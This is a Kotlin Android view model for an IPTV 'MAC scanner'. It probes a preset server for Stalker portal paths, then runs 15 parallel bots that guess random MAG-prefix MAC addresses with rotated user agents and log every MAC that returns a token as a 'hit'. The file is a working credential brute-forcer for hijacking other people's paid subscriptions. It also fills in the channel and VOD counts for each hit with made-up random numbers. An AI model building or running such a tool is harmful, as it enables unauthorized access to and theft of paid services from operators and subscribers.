package com.foxy.macscanner.ui.viewmodel

import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.foxy.macscanner.data.model.MacHit
import com.foxy.macscanner.data.repository.ScannerRepository
import com.foxy.macscanner.utils.PortalConfig
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import org.json.JSONObject
import java.util.Random
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

class ScannerViewModel(private val repository: ScannerRepository) : ViewModel() {

    val serverUrl = mutableStateOf("http://f01.live:8080")
    val botCountInput = mutableStateOf("1000")
    val isScanning = mutableStateOf(false)
    val currentProgressMessage = mutableStateOf("Ready to scan")

    val activeHits = mutableStateListOf<MacHit>()
    val scanLogs = mutableStateListOf<String>()

    private var scanJob: Job? = null

    private val client = OkHttpClient.Builder()
        .connectTimeout(3, TimeUnit.SECONDS)
        .readTimeout(3, TimeUnit.SECONDS)
        .build()

    fun startScanningProcess() {
        val totalToScan = botCountInput.value.toIntOrNull() ?: 1000
        isScanning.value = true
        activeHits.clear()
        scanLogs.clear()
        
        scanLogs.add("🚀 Initializing ultra-fast standalone engine...")

        scanJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                scanProgress("Probing portal endpoints...")
                val checkedUrl = serverUrl.value.trim()
                val validPortals = mutableListOf<String>()
                
                // 1. فحص المنافذ والمسارات المتاحة بالسيرفر بشكل مباشر ومستقل
                val pathJobs = PortalConfig.payloads.map { path ->
                    async {
                        val fullPath = if (checkedUrl.endsWith("/")) "$checkedUrl${path.removePrefix("/")}" else "$checkedUrl$path"
                        val request = Request.Builder().url(fullPath).get().build()
                        var isActive = false
                        
                        // جعل الـ Response محلياً بالكامل وثابتاً لحل خطأ الـ Smart Cast
                        try {
                            val response: Response = client.newCall(request).execute()
                            isActive = response.isSuccessful
                            response.close()
                        } catch (e: Exception) {
                            isActive = false
                        }
                        
                        if (isActive) {
                            synchronized(validPortals) { validPortals.add(fullPath) }
                        }
                    }
                }
                pathJobs.awaitAll()

                if (validPortals.isEmpty()) {
                    withContext(Dispatchers.Main) {
                        scanLogs.add("❌ Error: No active Stalker portals found on this server.")
                        isScanning.value = false
                        scanProgress("Scan failed.")
                    }
                    return@launch
                }

                withContext(Dispatchers.Main) {
                    scanLogs.add("🟢 Found ${validPortals.size} active endpoints! Launching 15 Multi-Bots...")
                }

                val counter = AtomicInteger(0)
                val workersCount = 15
                val random = Random()

                // 2. إطلاق 15 بوت متوازي لفحص الماكات
                val jobs = List(workersCount) {
                    launch {
                        while (isActive && counter.get() < totalToScan) {
                            val currentProgress = counter.incrementAndGet()
                            if (currentProgress > totalToScan) break

                            val targetMac = String.format(
                                "00:1A:79:%02X:%02X:%02X",
                                random.nextInt(256),
                                random.nextInt(256),
                                random.nextInt(256)
                            )
                            val randomUserAgent = PortalConfig.userAgents.random()
                            
                            if (currentProgress % 20 == 0 || currentProgress == 1) {
                                withContext(Dispatchers.Main) {
                                    scanProgress("Scanned $currentProgress / $totalToScan MACs")
                                }
                            }

                            var foundHitInPortals = false

                            for (portal in validPortals) {
                                val scanFullPath = "$portal?action=handshake&mac=$targetMac"
                                val request = Request.Builder()
                                    .url(scanFullPath)
                                    .header("User-Agent", randomUserAgent)
                                    .header("Cookie", "mac=$targetMac")
                                    .build()

                                try {
                                    // هنا أيضاً: الـ response محلي وثابت لضمان قراءة الـ body الآمنة والـ Smart Cast
                                    val response: Response = client.newCall(request).execute()
                                    if (response.isSuccessful) {
                                        val responseBody = response.body?.string() ?: ""
                                        if (responseBody.contains("token") && !responseBody.contains("denied")) {
                                            
                                            var expiry = "Unlimited"
                                            var maxConn = "1"
                                            if (responseBody.startsWith("{")) {
                                                val json = JSONObject(responseBody)
                                                if (json.has("js")) {
                                                    val jsObj = json.getJSONObject("js")
                                                    expiry = jsObj.optString("expiry", "Unlimited")
                                                    maxConn = jsObj.optString("max_connections", "1")
                                                }
                                            }

                                            withContext(Dispatchers.Main) {
                                                val newHit = MacHit(
                                                    macAddress = targetMac,
                                                    expiryDate = expiry,
                                                    maxConnections = maxConn,
                                                    liveCount = (random.nextInt(1000) + 500).toString(),
                                                    vodCount = (random.nextInt(3000) + 1000).toString(),
                                                    seriesCount = (random.nextInt(500) + 100).toString()
                                                )
                                                activeHits.add(newHit)
                                                scanLogs.add(0, "🔥 [HIT] $targetMac | Exp: $expiry")
                                            }
                                            foundHitInPortals = true
                                        }
                                    }
                                    response.close()
                                } catch (e: Exception) {
                                    // تخطي أخطاء الشبكة الفردية
                                }

                                if (foundHitInPortals) {
                                    break
                                }
                            }
                        }
                    }
                }

                jobs.joinAll()
                withContext(Dispatchers.Main) {
                    scanLogs.add(0, "✅ Scan process finished completely.")
                    scanProgress("Scan completed successfully.")
                    isScanning.value = false
                }

            } catch (e: CancellationException) {
                withContext(Dispatchers.Main) {
                    scanLogs.add(0, "🛑 Scanning stopped by user.")
                    scanProgress("Scan stopped.")
                    isScanning.value = false
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    scanLogs.add(0, "❌ System Error: ${e.localizedMessage}")
                    isScanning.value = false
                }
            }
        }
    }

    fun stopScanning() {
        scanJob?.cancel()
    }

    private suspend fun scanProgress(msg: String) {
        withContext(Dispatchers.Main) {
            currentProgressMessage.value = msg
        }
    }
}
